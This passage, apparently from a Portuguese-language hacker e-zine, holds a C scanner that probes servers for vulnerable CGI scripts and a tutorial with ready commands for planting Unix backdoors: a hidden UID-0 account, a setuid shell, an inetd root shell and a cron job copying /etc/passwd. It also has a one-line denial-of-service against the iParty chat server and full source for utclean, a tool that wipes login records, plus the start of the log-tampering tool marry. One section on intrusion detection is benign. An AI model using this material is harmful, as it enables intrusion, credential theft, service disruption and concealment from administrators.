+ char *caminhow[50];
+ char *cgibugado[50];
+
+ caminhow[1] = "GET /cgi-bin/phf HTTP/1.0\n\n";
+ caminhow[2] = "GET /cgi-bin/Count.cgi HTTP/1.0\n\n";
+ caminhow[3] = "GET /cgi-bin/test-cgi HTTP/1.0\n\n";
+ caminhow[4] = "GET /cgi-bin/php.cgi HTTP/1.0\n\n";
+ caminhow[5] = "GET /cgi-bin/handler HTTP/1.0\n\n";
+ caminhow[6] = "GET /cgi-bin/webgais HTTP/1.0\n\n";
+ caminhow[7] = "GET /cgi-bin/websendmail HTTP/1.0\n\n";
+ caminhow[8] = "GET /cgi-bin/webdist.cgi HTTP/1.0\n\n";
+ caminhow[9] = "GET /cgi-bin/faxsurvey HTTP/1.0\n\n";
+ caminhow[10] = "GET /cgi-bin/htmlscript HTTP/1.0\n\n";
+ caminhow[11] = "GET /cgi-bin/pfdispaly.cgi HTTP/1.0\n\n";
+ caminhow[12] = "GET /cgi-bin/perl.exe HTTP/1.0\n\n";
+ caminhow[13] = "GET /cgi-bin/wwwboard.pl HTTP/1.0\n\n";
+ caminhow[14] = "GET /cgi-bin/wrap HTTP/1.0\n\n";
+ caminhow[15] = "GET /cgi-bin/handler/ HTTP/1.0\n\n";
+ caminhow[16] = "GET /cgi-bin/campas HTTP/1.0\n\n";
+ caminhow[17] = "GET /cgi-bin/info2www HTTP/1.0\n\n";
+ caminhow[18] = "GET /cgi-bin/nph-test-cgi HTTP/1.0\n\n";
+ caminhow[19] = "GET /cgi-bin/view-source HTTP/1.0\n\n";
+
+ cgibugado[1] = "phf";
+ cgibugado[2] = "Count.cgi";
+ cgibugado[3] = "test-cgi";
+ cgibugado[4] = "php.cgi";
+ cgibugado[5] = "handler";
+ cgibugado[6] = "webgais";
+ cgibugado[7] = "websendmail";
+ cgibugado[8] = "webdist.cgi";
+ cgibugado[9] = "faxsurvey";
+ cgibugado[10] = "htmlscript";
+ cgibugado[11] = "pfdisplay";
+ cgibugado[12] = "perl.exe";
+ cgibugado[13] = "wwwboard.pl";
+ cgibugado[14] = "wrap";
+ cgibugado[15] = "handler";
+ cgibugado[16] = "info2www";
+ cgibugado[17] = "campas";
+ cgibugado[18] = "nph-test-cgi";
+ cgibugado[19] = "view-source";
+ if (argc<2)
+   {
+   printf("\nUso:[1m %s host[0m",argv[0]);
+   printf("\n   Ou:[1m %s host -d [0mpara o modo em debug",argv[0]);
+   printf("\n   Ou ainda:[1m %s host -d -p [0mpara o modo em debug com pausas\n",argv[0]);
+   exit(0);
+   }
+
+ if (argc>2)
+   {
+   if(strstr("-d",argv[2]))
+     {
+     debugm=1;
+     }
+   }
+
+if (argc>3)
+  {
+  if(strstr("-p",argv[3]))
+    {
+    pausar=1;
+    }
+   }
+
+ if ((he=gethostbyname(argv[1])) == NULL)
+   {
+   herror("gethostbyname");
+   exit(0);
+   }
+
+ printf("\n\nChecador de CGI feito originalmente por [CKS & Fdisk]");
+ printf("\n\n[1mTraduzido e melhorado por Cacaio Torquato <cacaio@deathknights.com>[0m\n\n\n");
+ start=inet_addr(argv[1]);
+ counter=ntohl(start);
+
+   sock=socket(AF_INET, SOCK_STREAM, 0);
+   bcopy(he->h_addr, (char *)&sin.sin_addr, he->h_length);
+   sin.sin_family=AF_INET;
+   sin.sin_port=htons(80);
+
+  if (connect(sock, (struct sockaddr*)&sin, sizeof(sin))!=0)
+     {
+     perror("connect");
+     }
+   printf("\n\n\t\t -=[     Checando a versao do httpd     ]=-\n");
+   send(sock, "HEAD / HTTP/1.0\n\n",17,0);
+   recv(sock, buffer, sizeof(buffer),0);
+   printf("%s",buffer);
+   close(sock);
+   printf("\n\t\t -=[ Iniciando a procura pelos CGI's... ]=-\n");
+while(count++ < 19)
+   {
+   printf("Procurando por %s: ",cgibugado[count]);
+   sock=socket(AF_INET, SOCK_STREAM, 0);
+   bcopy(he->h_addr, (char *)&sin.sin_addr, he->h_length);
+   sin.sin_family=AF_INET;
+   sin.sin_port=htons(80);
+   if (connect(sock, (struct sockaddr*)&sin, sizeof(sin))!=0)
+     {
+     perror("connect");
+     }
+   for(numin=0;numin < 1024;numin++)
+      {
+      bufferdocgi[numin] = '\0';
+      }
+
+   send(sock, caminhow[count],strlen(caminhow[count]),0);
+   recv(sock, bufferdocgi, sizeof(bufferdocgi),0);
+   blaetal = strstr(bufferdocgi,mensagem);
+   if(blaetal != NULL)
+       printf("[1mEncontrado!!! [0m;)[0m\n");
+       else
+        printf("Nao encontrado\n");
+        if(debugm==1)
+    {
+    printf("\n\n *************************\n\t %s \n *************************\n",bufferdocgi);
+    if(pausar==1)
+     {
+     printf("\nPressione qualquer tecla para continuar...");
+     getchar();
+     }
+   }
+  close(sock);
+  }
+}
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+
+     Cacaio               cacaio@deathknights.com
+     `'`'`'               `'`'`'`'`'`'`'`'`'`'`'`
+
+-=[  6  ]=-
+.------------.
+|  Backdoors  \______________________________________________________________
+`----------------------------------------------------------------------------'
+                             by Cheat Struck
+
+	Vou descrever aqui diversos tipos de backdoors que podem ser instaladas
+num sistema unix. Nao soh backdoors que dao acesso de root como tambem back'z
+simples que dao desde shell's ao sistema ateh o /etc/passwd.
+
+******************************************************************************
+
+	Rlogin Backdoor (shell)
+
+	Hehe. Much Simple...
+	Edite o arquivo .rhosts no diretorio home de qualquer usuario.
+	Como conteudo coloque "+ +". Assim para entrar no sistema novamente,
+basta entrar com o seguinte comando:
+
+rlogin -l <username> <host>
+
+******************************************************************************
+
+	CGI Backdoor (shell)
+
+	Apenas para sistemas administrados por lamahs.
+	Primeiro faça uma shell backdoor. Agora faça um script no diretorio
+dos cgis usados pelo sistema com o seguinte conteudo:
+
+/tmp/.junk                   #Essa e' a shell backdoor
+$1 $2 $3 $4 $5 $6 $7         #Isso executa os comandos
+
+	Agora use essa backdoor para executar qualquer comando como root pelo
+seu browser, como se estivesse exploitando o phf.
+
+******************************************************************************
+
+	Sync Backdoor (shell)
+
+	Olhe no /etc/passwd se existe a conta sync.
+	Se existir, basta fazer o seguinte:
+
+rm -f /bin/sync
+ln /bin/sync /bin/sh
+
+	Prontu! O sync tem UID e GID iguais a 1 (bem alto nao??).
+	NOTA: Nao coloque senha pois fica desconfiavel.
+
+******************************************************************************
+
+	TFTP Backdoor (files)
+
+	Pode ser considerado uma backdoor pois com isso e' possivel pegar
+qualquer arquivo do sistema, incluindo o /etc/passwd ou /etc/shadow.
+	Basta retirar o comentario desse serviço no "/etc/inetd.conf".
+
+******************************************************************************
+
+	Finger Backdoor (files)
+
+	Moleza, porem de facil detecçao.
+	Faça um link do "/etc/passwd" ou "/etc/shadow" para o ".plan" no dire-
+torio home do root.
+	Agora basta dar um finger no root e...
+
+******************************************************************************
+
+	Cron Backdoor (files)
+
+	Eu nao vou ficar explicando tudinho sobre o Cron, se quizer um pouco
+de informacao, leia na Axur05 numero 3, que saiu algo sobre isso.
+	O legal e' que colocando uma simples linha em um arquivo, voce estara'
+atualizado mensalmente das contas do sistema.
+	Basta colocar a seguinte linha no "/usr/lib/cron/cron.allow":
+
+00     24      1       *       *       "cat /etc/passwd >>/usr/keeper/.pass"
+
+******************************************************************************
+
+	UID/GID Backdoors (ROOT)
+
+	Bahhh.. Lamahz se divertem com essas backdoors e ficam se achando os
+hackers (se bem que eles soh conseguem colocar essa backdoor no seu proprio
+sistema, pois e' o unico que conseguiram rootear).
+	O que tem q se fazer e' adicionar uma conta com UID e GID igual a 0.
+	Simples nao??
+
+keeper::0:0:Cay-Keep3r:/:/bin/csh
+
+	Para detectar essa backdoor basta dar o seguinte comando:
+
+cat /etc/passwd | grep :0:                 <== Se nao tiver shadow
+cat /etc/shadow | grep :0:                 <== Se tiver shadow
+
+	Isso e' usado pelos admins de grandes redes que nao vao ficar lendo
+conta por conta... linha por linha... Entao existe uma forma de se disviar
+disso que varios roots vao deixar passar em branco.
+
+keeper::O755:O755:Cay-Keep3r:/:/bin/csh
+
+	Note o UID e GID (O755)... Nao e' 0755 e sim O755. Isso porque o Unix
+nao reconhece letras como ID's, apenas numeros. Sendo assim como nao sera re-
+conhecido o "O" entao o ID voltara para o "0" (zero).
+	Agora fica beleza neh??
+
+******************************************************************************
+
+	Shell Backdoor (ROOT)
+
+	Esta backdoor o que tem de simples, tem de poderosa. Ela faz nada mais
+do que dar um prompt de root para qualquer usuario. Basta voce se logar uma
+vez como root e fazer o seguinte:
+
+cp /bin/sh /home/keep3r
+chmod 755 /home/keep3r/sh
+chmod +s /home/keep3r/sh
+
+	E e' soh isso. Claro que nao e' seguro deixar a backdoor com o nome de
+"sh". Para isso basta renomea-lo e pronto. Para ativar a backdoor execute o
+arquivo.
+	Agora vou descrever como encontrar uma backdoor dessas. Poucos sabem
+dessa forma e pensam que essas backdoors sao quase indetectaveis, mas estao
+errados. Basta entrar com o comando:
+
+find /home/ -perm -4000
+
+	Claro que /home/ e' o diretorio onde se armazenam os home dos usuarios.
+Se o cara for esperto, colocara' essa backdoor em um diretorio publico que
+contenha bastantes arquivos com setuid(+s).
+	Apos ter digitado o comando, aparecera' uma lista de arquivos que tao
+marcados como +s. Verifique-os.
+
+******************************************************************************
+
+	Service Backdoor (ROOT)
+
+	Simples mas detectavel...
+
+echo "cool    775/tcp    cnn" >> /etc/services
+echo "cool   stream tcp nowait root /bin/sh -i" >> /etc/inetd.conf
+
+	Entao basta se conectar a porta 775 e prontu!
+	Agora voce vai ter que ir dormir rezando para o root do sistema nao
+olhar o "/etc/services" e encontrar aquele "cool 775/tcp" ou o "/bin/sh -i"
+no "/etc/inetd.conf".
+	Para deixar a backdoor menos detectavel, procure a linha do serviço
+courier no "/etc/inetd.conf". Mude para:
+
+courier    stream  tcp   nowait   root   /usr/sbin/in.courierd -i
+
+	NOTA: Retire o # da frente Lamah :P .
+	Se nao for encontrado o servico, adicione-o no meio do "/etc/services"
+da seguinte forma:
+
+courier         530/tcp         rpc             # experimental
+
+	Agora que vem o nucleo da backdoor..
+
+rm /usr/sbin/in.courierd
+cp /bin/sh /usr/sbin/in.courierd
+chmod a+x /usr/sbin/in.courierd
+
+	Viu?? tudo o que fizemos foi copiar a shell para o arquivo que estabe-
+lece a conexao do courier. Se quizer, pode tambem colocar "in.courierd:all" no
+"etc/hosts.allow". Assim qquer um pode usar esta backdoor.
+	Isto pode ser feito com qquer servico e nao apenas no courier.
+
+******************************************************************************
+
+	Bahh! Por hoje chega.
+
+        Cheat Struck
+        `'`'`'`'`'`'
+
+-=[  7  ]=-
+.---------.
+|  iParty  \_________________________________________________________________
+`----------------------------------------------------------------------------'
+                               by Cacaio
+
+[TRADUCAO]                                                          [TRADUCAO]
+
+O iParty e' um programa de chat para windows.
+
+Seu servidor escuta em uma porta especifica(6004 e' a padrao) pelos pedidos
+dos clientes. Se alguem conectar ao servidor e enviar um grande numero de
+caracteres '^?' (o 255 ASCII ou FF em hexa), o servidor simplesmente se
+fechara e desconectara os usuarios.
+
+Nao aparece no log nada, e quem ataca nem precisa saber o noe da sala.
+
+O iParty parece usar uma versao modificada do protocolo do X-Win, como ele
+usa o mesmo formato para requisicoes e resposta.
+
+A maneira mais facil de exploitar e' digitar:
+
+cat /dev/kmem | telnet alvo.com 6004
+
+        Cacaio
+
+-=[  8  ]=-
+.----------------------------.
+| Simples gerador de wordlist \______________________________________________
+`----------------------------------------------------------------------------'
+                              by Cacaio
+
+To com preguica de escrever algo sobre ele.. eu tinha escrito mas agora nem
+vou escrever de novo.. toma o codigo ae:
+
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+# Gerador de wordlist por manicx e G
+# Traduzido por Cacaio Torquato <cacaio@deathknights.com>
+# uso: "perl wordlist.pl"
+
+system("cls");
+print ("\n\t**************************************************");
+print ("\n\t*                wordlist.pl  V0.01              *");
+print ("\n\t*                    manicx e G                  *");
+print ("\n\t*              29 de Novembro de 1998            *");
+print ("\n\t*   Ultima versao em www.infowar.co.uk/manicx/   *");
+print ("\n\t**************************************************");
+sleep 1;
+srand(time);
+             # use aqui os caracteres que voce quer usar nas senhas
+             # randomicas
+@c=split(/ */, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789");
+
+print "\nEntre o nome do arquivo para as senhas serem salvas:";
+$word = <STDIN>;
+chop ($word);
+open (CONF, ">$word") or die print $word, "\n Nome de arquivo invalido. \n";
+
+print "\nNumero de senhas para serem geradas:";
+$many=<STDIN>;
+
+for($i=0; $i <$many; $i +=1)
+	{
+print CONF 	$c[int(rand(62))], $c[int(rand(62))], $c[int(rand(62))],
+		$c[int(rand(62))], $c[int(rand(62))], $c[int(rand(62))],
+		$c[int(rand(62))], $c[int(rand(62))];
+print CONF "\n";
+	}
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+
+        Cacaio
+
+-=[  9  ]=-
+.---------------------------------------------.
+| Deteccao de Ataques em Sistemas Distribuidos \_____________________________
+`----------------------------------------------------------------------------'
+                              by REBOOT
+
+Resumo
+
+Este documento apresenta, em um nivel conceitual, um novo paradigma de
+seguranca de sistemas inserido na tecnologia Sistemas Sobreviventes, que
+tem como objetivo nao so a prevencao de ataques mas, tambem, a deteccao e
+tratamento dos mesmos em tempo real.
+
+1. INTRODUCAO
+
+A sociedade esta se desenvolvendo cada vez mais dependente de sistemas
+altamente distribuidos que operam em uma rede sem limites definidos, sem
+uma administracao centralizada e sem uma politica de seguranca unificada, a
+Internet. Empresas como bancos, companhias de telecomunicacoes, hospitais,
+companhias distribuidoras de energia eletrica e agua, entre outras, que
+fornecem servicos basicos para o funcionamento de qualquer cidade, estao se
+ligando a essa grande rede buscando novos niveis de integracao
+organizacional por ela oferecidos, passando a correr serios riscos de
+seguranca.
+
+As atuais tecnicas de seguranca largamente utilizadas consistem em apenas
+fortificar o sistema contra invasoes e, em caso de um incidente, o sistema
+e recuperado e reparado apos a ocorrencia do mesmo; neste meio tempo o
+fornecimento de servicos essenciais pode ser suspenso.
+
+Sistemas Sobreviventes, uma nova tecnologia sendo estudada e desenvolvida,
+tem como um de seus principais objetivos criar sistemas de seguranca que
+nao so fortifiquem o sistema mas, tambem, sejam capazes de detectar e
+tratar um ataque em tempo real, protegendo servicos considerados de extrema
+necessidade. Assim, o fornecimento de servicos essenciais e mantido com
+todas suas caracteristicas basicas de seguranca e integridade, mesmo
+durante um ataque.
+
+2. SOBREVIVENCIA
+
+Sobrevivencia e a capacidade do sistema cumprir sua missao na presenca de
+ataques, falhas ou acidentes. O termo sistema e aqui utilizado no mais
+amplo sentido possivel, incluindo redes e sistemas de larga escala.
+
+O termo missao refere-se a um conjunto de requerimentos ou objetivos
+definidos a alto nivel de abstracao.
+
+Os termos ataque, falha e acidente compreendem todos os eventos
+potencialmente danificadores; mas nao separam esses eventos em conjuntos
+mutuamente exclusivos ou distinguiveis.  freqentemente dificil determinar
+se um evento em particular e resultado de um ataque, de uma falha de um
+componente ou de um acidente.
+
+     Ataques sao eventos potencialmente danificadores orquestrados por um
+     adversario inteligente. Ataques compreendem intrusoes e danificacao de
+     servicos. Um sistema o qual assume uma posicao defensiva frente a um
+     ataque reduz sua funcionalidade e utiliza seus recursos para monitorar
+     o ambiente e proteger o resto do sistema.
+
+     Falhas sao eventos potencialmente danificadores causados por
+     deficiencias no sistema ou em um elemento externo do qual esse
+     depende. Falhas podem ocorrer devido a erros no projeto de programas,
+     degradacao do hardware, erros humanos ou dados corrompidos.
+
+     Acidentes descrevem diversos eventos potencialmente danificadores que
+     ocorrem de forma randomica, como desastres naturais. Pensa-se em
+     acidentes como eventos externamente gerados (fora do sistema) e falhas
+     como eventos internamente gerados.
+
+O que resume um sistema sobrevivente e a capacidade de fornecer servicos
+criticos ao mesmo tempo em que controla um ataque.
+
+3. PREVENCAO E DETECCAO DE INTRUSAO
+
+Conceitualmente o processo de deteccao de intrusao situa-se apos o de
+prevencao, no qual estao atualmente localizados os esforcos em termos de
+seguranca de um sistema (figura 1). Nele os recursos mais utilizados sao
+firewalls, programas de seguranca para o usuario final (ex.: ssh - secure
+shell), aplicacao de patchs (correcoes) aos elementos do sistema, entre
+outros.
+
+O processo de deteccao e a segunda camada onde a seguranca e implementada.
+Esta tem tido crescente enfoque nos £ltimos dois anos no desenvolvimento de
+pesquisas e de novos produtos direcionados a area de seguranca. Atualmente,
+na maioria dos sistemas, a ocorrencia de uma intrusao leva a procedimentos
+de recuperacao que necessitam que o sistema seja isolado, estudado,
+reparado e entao corrigido de modo a evitar a repeticao da mesma. Os novos
+estudos em deteccao levam a uma estrutura que busca detectar a ocorrencia
+de intrusoes e atividades suspeitas e, em detrimento dessas, o sistema
+possa reagir protegendo outras partes do sistema e anulando a invasao.
+
+                           (veja figura1.gif)
+
+Na figura 2 tem-se o modelo de um sistema de deteccao apresentado no
+programa de Sistemas Sobreviventes da DARPA/ITO (Defense Advanced Research
+Projects Agency / Information Technology Office - US).
+
+                           (veja figura2.gif)
+
+O modelo apresentado na figura 2 e composto de alguns elementos basicos
+como sensores e modulos de acao. Cabe aos sensores a funcao de monitorar a
+seguranca do sistema mantendo constante comunicacao com o modulo detector
+de intrusao. Este, ao verificar a existencia de um ataque ou de uma
+atividade incomum ao sistema, toma as primeiras medidas para eliminar o
+ataque ou pelo menos para reduzir a efetividade do mesmo e alerta o resto
+do sistema. Na sequencia, ao receber um alerta do detector de intrusao, o
+modulo ativador do modo de emergencia aumenta o grau de protecao e robustez
+dos sistemas criticos e direciona recursos para controlar o ataque. Este
+tambem cria um aquario (ambiente que isola o ataque, e da a impressao ao
+atacante de que ele se encontra realmente dentro do sistema.) visando
+distrair o atacante e possibilitar que o ataque seja observado e estudado
+em um ambiente controlado. A partir desse momento um assistente humano pode
+recuperar os servicos e o estado de seguranca do sistema.
+
+Uma vez atacado, o sistema deve ser capaz de manter os sistemas criticos
+funcionando ao mesmo tempo em que faz o tratamento do ataque e re£ne
+informacoes de modo a poder identifica-lo futuramente.
+
+A nivel de implementacao os processos de prevencao e deteccao integram-se
+em alguns pontos de tal maneira que pode vir a ser impossivel de
+identificar de forma exclusiva um ou outro.
+
+4. ESTADO-DA-ARTE
+
+Diversas ferramentas e protocolos tem sido desenvolvidos para a aplicacao
+desta tecnologia. Abaixo tem-se relacionadas algumas delas:
+
+   * IDIP (Intrusion Detection and Isolation Protocol): desenvolvido no
+     projeto Adaptive System Security Policies pela Boeing Defense & Space
+     Group e DARPA; e um protocolo para rastrear e isolar intrusos uma vez
+     que tenham penetrado em alguma parte do sistema, permite um alto grau
+     de integracao entre os elementos do sistema;
+
+   * SNS (roteador com filtragem): desenvolvido pela Boeing; transmite ou
+     bloqueia datagramas baseado nos enderecos de origem e destino e
+     requisicao servico (FTP, Telnet, HTTP, etc.);
+
+   * MIDS (sistema de deteccao de intrusao): criado na Universidade da
+     California, Davis; monitora a rede procurando por acoes incomuns ou
+     inesperadas (ex.: datagramas de conexoes, nomes de arquivos ou nomes
+     de usuarios);
+
+   * DC ( intrusion Discovery Coordinator): criado pela Boeing; coleta e
+     exibe dados de elementos utilizando o IDIP.
+
+Existem ainda diversas pesquisas sendo realizadas em universidades
+americanas com apoio da DARPA/ITO. Grandes empresas, como Bancos, tem
+investido cada vez mais na aquisicao e desenvolvimento dessa tecnologia.
+
+5. CONCLUSOES
+
+Tem-se claramente evidenciada a existencia de um novo e promissor campo de
+pesquisa. Organizacoes atuantes nas mais diversas areas, tem manifestado
+crescente interesse no tema aqui tratado e relacionado, uma vez que e
+inevitavel e necessaria a evolucao de sistemas operantes em ambientes
+distribuidos, onde nao ha limites, administracao ou politica de seguranca
+definidas.
+
+        REBOOT
+        `'`'`'
+
+Fontes para a materia:
+
+[1] R. J. Ellison et al. Survivable Network Systems: An Emerging
+Discipline, Software Engineering Institute - Carnegie Mellon University,
+Novembro 1997.
+
+[2] T. Lunt. Survivability of Large Scale Systems, DARPA/ITO, disponivel em
+http://www.darpa.mil/ito.
+
+[3] M. Barbacci. Survivability in the age of vulnerable systems, Carnegie
+Mellon University, 1996, disponivel em
+http://www.cert.org/reseach/isw97_hypertext/all_the_papers/
+
+[4] H. Lipson et al. Survivable Architetures, Software Engineering Institute
+- Carnegie Mellon University, Fevereiro 1997, disponivel em
+http://www.cert.org/reseach/isw97_hypertext/all_the_papers/
+
+[5] R. C. Linger et al. Requirements Definition for Survivable Network
+Systems, Software Engineering Institute - Carnegie Mellon University,
+disponivel em http://www.cert.org/research/req-paper/meadframe.html
+
+[6] T. Longstaff. Coming Attractions in Survivable Systems, Software
+Engineering Institute - Carnegie Mellon University, disponivel em
+http://www.cert.org/research/start_page.html
+
+-=[  10  ]=-
+.-------------.
+| l0gs.......  \_____________________________________________________________
+`----------------------------------------------------------------------------'
+                                 by Cacaio
+
+Bem.. eu ia escrever sobre logs, falar que existem programas que alteram sua
+presenca nos logs, como o utclean e o marry, que estao aqui:
+
+utclean.c
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+/*
+UTClean.c - cleans wtmp/wtmpx/utmp/utmpx/lastlog
+Usage: utclean <username> <fixthings?> [hostname]
+Written by undrtaker (undtaker@xxx.xxxxxxx.xxx.xx) - drop me a line
+* * * hostname only affects wtmp/wtmpx (would u like it to utmp?)
+*/
+
+#include <fcntl.h>
+#include <utmp.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <lastlog.h>
+#include <stdio.h>
+
+#define LASTLOG  /* we always clean wtmp/utmp. Lastlog and ?tmpx, up to u. */
+/* #define WTMPX */
+
+#ifdef LASTLOG
+	#include <lastlog.h>
+#endif
+#ifdef WTMPX
+	#include <utmpx.h>
+#endif
+main(argc, argv)
+    int     argc;
+    char    *argv[];
+{
+#ifdef WTMPX
+	struct utmpx utx;
+#endif
+	struct lastlog l;
+	int entries = 0, removed = 0, done = 0, size, onlyhost;
+	struct utmp ut;
+	int fp=-1,fd=-1;
+	char username[10], host[100];
+	if ( (argc != 3) && (argc != 4) ) {
+		fprintf(stderr,"usage: %s <username> <fixthings> [hostname]\n",argv[0]);
+		exit(2);
+	}
+	size = sizeof(ut);
+	strcpy(username,argv[1]);
+	if(argc==4){ strcpy(host, argv[3]); onlyhost=1; }
+	else onlyhost = 0;
+	fp = open("/var/adm/wtmp",O_RDONLY);
+	fd = open("wtmp.tmp",O_WRONLY|O_CREAT);
+	if  (fp < 0){ perror("wtmp"); close(fd); }
+	else if (fd < 0){ perror("wtmp.tmp"); close(fp); }
+	else {
+		while (read(fp,&ut,size)==size) {
+			if ( (strncmp(ut.ut_name,username,strlen(username)))
+				|| (onlyhost && (!strstr(ut.ut_host,host))) )
+				write(fd,&ut,size);
+			else removed++;
+			entries++;
+		}
+		printf("\nwtmp: %i entries removed (total: %i)",
+			 removed, entries);
+		close(fp);
+		close(fd);
+	}
+	entries = removed = 0;
+	size = sizeof(struct utmp);
+	fd = open("/etc/utmp", O_RDWR);
+	if (fd < 0) perror("utmp");
+	else {
+		while (read(fd, &ut, size) == size) {
+			if (!strncmp(ut.ut_user, username, strlen(username))) {
+				removed++;
+				memset(&ut, 0, size);
+				lseek(fd, -1*size, SEEK_CUR);
+				write(fd, &ut, size);
+			}
+			entries++;
+		}
+		close(fd);
+		printf("\nutmp: %i entries removed. (total: %i)",
+			removed, entries);
+	}
+
+#ifdef LASTLOG
+	entries = removed = 0;
+	size = sizeof(struct lastlog);
+	fd = open("/var/adm/lastlog", O_RDWR);
+	if (fd < 0) perror("lastlog");
+	else {
+		lseek(fd, size*getuid(), SEEK_SET);
+		read(fd, &l, size);
+		l.ll_time = 0;
+		strncpy(l.ll_line, "ttyq2 ", 5);
+		gethostname(l.ll_host, 16);
+		lseek(fd, size*getuid(), SEEK_SET);
+		write(fd, &l, size);
+		close(fd);
+		printf("\nlastlog: fixed");
+	}
+#endif
+#ifdef WTMPX
+	size = sizeof(utx);
+        fp = open("/var/adm/wtmpx",O_RDONLY);
+        fd = open("wtmpx.tmp",O_WRONLY|O_CREAT);
+        if  (fp < 0){ perror("wtmpx"); close(fd); }
+        else if (fd < 0){ perror("wtmpx.tmp"); close(fp); }
+        else {
+                while (read(fp,&utx,size)==size) {
+                        if( (strncmp(utx.ut_name,username,strlen(username)))
+			    || (onlyhost && (!strstr(ut.ut_host,host))) )
+                                write(fd,&utx,size);
+                        else removed++;
+                        entries++;
+                }
+                printf("\nwtmpx: %i entries removed (total: %i)",
+                         removed, entries);
+                close(fp);
+                close(fd);
+        }
+        entries = removed = 0;
+        fd = open("/etc/utmpx", O_RDWR);
+        if (fd < 0) perror("utmpx");
+        else {
+                while (read(fd, &utx, size) == size) {
+                        if (!strncmp(utx.ut_user, username, strlen(username))) {
+                                removed++;
+                                memset(&utx, 0, size);
+                                lseek(fd, -1*size, SEEK_CUR);
+                                write(fd, &utx, size);
+                        }
+                        entries++;
+                }
+                close(fd);
+                printf("\nutmpx: %i entries removed. (total: %i)",
+                        removed, entries);
+        }
+
+#endif
+	if(argv[2][0] == 'y'){
+		system("ls -la /var/adm/wtmp* ; /bin/cp -v ./wtmp.tmp /var/adm/wtmp ; rm -v ./wtmp.tmp");
+		#ifdef WTMPX
+			system("/bin/cp -v ./wtmpX.tmp /var/adm/wtmpx ; rm -v /wtmpX.tmp");
+		#endif
+		system("ls -la /var/adm/wtmp*");
+		printf("\nfixthings: done.");
+	}
+	printf("\n\n...that's it. peace man :)\n\n");
+}
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+
+marry.c
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+/* marry v1.1 (c) 1991 -- Proff -- proff@suburbia.apana.org.au,
+ * All rights reserved.
+ *
+ * May there be peace in the world, and objectivity amoung men.
+ *
+ * You may not use this program for unethical purposes.
+ *
+ * You may not use this program in relation to your employment, or for monetary
+ * gain without express permission from the author.
+ *
+ * usage:
+ *   marry [-aetsuScDn] [-i src] [-o obj] [-d dump] [-p pat] [-v pat] [-m [WLA]]
+ *         [-E editor] [-h program] [-b backup ]
+ *
+ *   -a		automode, dump, run editor over dump and re-assemble to object
+ *   -e		edit source, assemble directly to input file, imples no insertion
+ *              of records before an equal quantity of deltion
+ *   -t		truncate object to last line of dump source when assembling
+ *   -s		squeeze, delete all record in input not occuring in dump
+ *              (higher entries in input will be appended unless -t is also
+ *              specified)
+ *   -u 	when in [L]astlog mode do user-id -> name lookups (time consuming)
+ *   -S		Security, when in [A]cct and -[a]uto mode replace editor's acct
+ *              record with an unmodified random previous entry, detach from
+ *              terminal, SIGKILL ourselves or execlp [-h program] to hide our
+ *              acct record (marry should be exec'ed under these circumstances)
+ *   -c		clean, delete backup and dump files once complete
+ *   -D		Delete our self once complete (i.e argv[0])
+ *   -n		no backups, don't make backups when in -e, -a modes or when
+ *              -i file == -o file
+ *   -i src	input, the utmp, wtmp, lastlog or p/acct file concerned. defaults
+ *              to the system wtmp/lastlog/pacct depending on mode if not specified
+ *   -o obj     output, the dump assembled and input merged version of the
+ *              above. if given and not in -[a]uto mode, implies we are
+ *              assembling, not dumping.
+ *   -d dump	dump, the dump (editable representation of src) file name. this
+ *              is is either an input (-o specified) an output (no -o) or both
+ *              -[a]uto. defaults to "marry.dmp" in the current directory if not
+ *              specified
+ *   -p pat     pattern match. When disassembling (dumping), only extract records
+ *              which match (checked against all string fields, and the uid if
+ *              the pattern is a valid username)
+ *   -v pat	inverse pattern match. like egrep -v. above non-logic features.
+ *   -m mode	mode is one of:
+ *
+ *			W  -  utmp/wtmp (or utmpx/wtmpx see UTMPX #define)
+ *                      L  -  lastlog
+ *                      A  -  acct/pacct
+ *
+ *   -E editor	editor to be used in -[a]uto mode. defaults to /usr/bin/vi. must
+ *              be the full path in -[S]ecurity mode (we do some clever
+ *              symlinking)
+ *   -h program hide, if -S mode is on, then attempt to conceal our acct entry by
+ *              execlp'ing the specified program. this seems to work on BSD derived
+ *              systems. with others, your might want to just call marry something
+ *              innocous.
+ *   -b backup  name of backup file, defaults to "marry.bak"
+ *
+ *   the following instruction codes can be placed in position one of the dump
+ *   lines to be assembled (e.g "0057a" -> "=057a"):
+ *
+ *   '='	tag modification of entry.
+ *   '+'	tag insertion of entry
+ *
+ * Examples:
+ *
+ * $ marry -mW -i /etc/utmp -s -a	# dump, edit, re-assemble and strip deleted
+ *                                      # entries from utmp
+ *
+ * $ marry -mL -u -a -n -e	        # dump lastlog with usernames, edit, make no
+ *                                      # backups and re-assemble in-situ directly to
+ *                                      # lastlog
+ *
+ * $ marry -mW -a -p mil -E emacs	# dump all wtmp entries matching "mil", edit
+ *                                      # with emacs, re-assemble and re-write to wtmp
+ *
+ * $ exec marry -mA -SceD 		# dump all acct entries by root, edit, remove
+ *     -h /usr/sbin/in.fingerd          # editor's acct record, re-assemble directly
+ *     -p root -a -i /var/account/acct  # to acct in-situ, delete backup and dump file,
+ *                                      # delete ourself from the disk, unassign our
+ *                                      # controling terminal, and lastly overlay our
+ *                                      # self (and thus our to be acct record) with
+ *                                      # in.fingerd
+ */
+
+#define UTMP
+#undef UTMPX /* solaris has both */
+#define LASTLOG
+#define PACCT
+
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/time.h>
+#include <sys/stat.h>
+#include <sys/wait.h>
+#include <fcntl.h>
+#include <signal.h>
+#include <pwd.h>
+#include <grp.h>
+#include <errno.h>
+
+#ifdef __SVR3
+#  include <getopts.h>
+#endif
+#ifndef bsd
+#  if defined(__NetBSD__) || defined(bsdi) || defined(BSDI) || defined(__386BSD__)
+#    define bsd
+#  endif
+#endif
+
